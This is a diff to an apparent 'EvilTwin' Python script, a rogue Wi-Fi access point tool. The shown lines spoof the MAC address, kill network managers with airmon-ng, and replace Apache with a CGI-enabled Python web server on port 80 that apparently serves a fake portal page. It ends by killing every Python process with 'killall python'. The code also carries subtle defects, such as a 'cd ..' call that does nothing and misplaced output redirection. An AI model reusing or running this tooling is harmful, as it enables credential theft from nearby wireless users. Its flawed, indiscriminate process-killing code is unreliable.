@@ -48,9 +48,12 @@ class EvilTwin:
         self.inter = inter
         print ("\n>>> Change MAC address")
         os.system('macchanger -a ' + self.inter + ' > /dev/null 2>&1')
+        
         print (">>> restart-apache2")
         os.system('service apache2 stop > /dev/null 2>&1')
-        os.system('service apache2 start > /dev/null 2>&1')
+        os.system('cd html && python -m http.server --cgi 80 & > /dev/null 2>&1')
+        os.system('cd ..')
+        #os.system('service apache2 start > /dev/null 2>&1')
 
         print (">>> Enabling Monitor Mode")
         os.system('airmon-ng check kill > /dev/null 2>&1')
@@ -122,3 +125,4 @@ if(__name__ == "__main__"):
     configF()
     configB()
     x = EvilTwin(wInt)
+    os.system('killall python')
